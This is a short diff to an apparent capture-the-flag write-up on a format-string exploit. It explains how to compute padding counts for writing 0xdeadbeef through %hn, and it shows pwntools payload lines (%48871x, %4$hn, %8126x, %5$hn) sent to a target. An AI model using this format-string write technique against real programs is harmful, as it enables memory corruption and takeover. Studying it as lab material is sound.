@@ -27,7 +27,9 @@ the idea is to write the (address of target) + (address of target + 2 ) + "n byt
 %5$hn will write m bytes in the higher two bytes of the target
 
 Now, how to calculate n and m ?
+
 we want to write 0xbeef in the lower bytes, so n = 0xbeef - (4 + 4) = 48871
+
 we want to write 0xdead in the higher bytes, so m = 0xdead - 0xbeef = 8126
 
 Again we have another problem, the buffer size is limited to 60 bytes, so we can't write 48871 bytes as an input !!!!
@@ -47,6 +49,6 @@ payload += b"%48871x"
 payload += b"%4$hn"
 payload += b"%8126x"
 payload += b"%5$hn" 
-pause()
+#pause()
 p.sendline(payload)
 p.interactive()
